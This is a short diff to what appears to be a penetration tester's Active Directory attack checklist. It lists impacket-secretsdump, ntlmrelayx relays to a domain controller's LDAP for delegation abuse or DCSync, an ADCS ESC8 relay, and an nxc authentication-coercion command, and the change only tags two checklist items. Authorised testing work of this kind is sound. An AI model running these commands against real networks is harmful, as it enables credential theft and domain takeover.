@@ -51,9 +51,9 @@ proxychains -q impacket-secretsdump -no-pass '<Domain>/<TargetUser>@<TargetIP>'
 Signing on the DC's LDAP blocks a relay from SMB, but not one from HTTP, such as WebDAV.
 sudo impacket-ntlmrelayx -t ldaps://<DCIP> --delegate-access -smb2support
 sudo impacket-ntlmrelayx -t ldap://<DCIP> --escalate-user '<Username>' -smb2support
-- [ ] A computer account caught with --delegate-access: a new machine with resource-based constrained delegation over it
+- [ ] A computer account caught with --delegate-access: a new machine with resource-based constrained delegation over it: :Pb delegation
 - [ ] --escalate-user gives my user DCSync when the caught account may change the domain's ACL
-- [ ] Relaying to the CA's web enrollment instead, ADCS ESC8
+- [ ] Relaying to the CA's web enrollment instead, ADCS ESC8: :Pb adcs
 
 ## Make a DC authenticate to me
 nxc smb <DCIP> -u '<Username>' -p '<Password>' -M coerce_plus
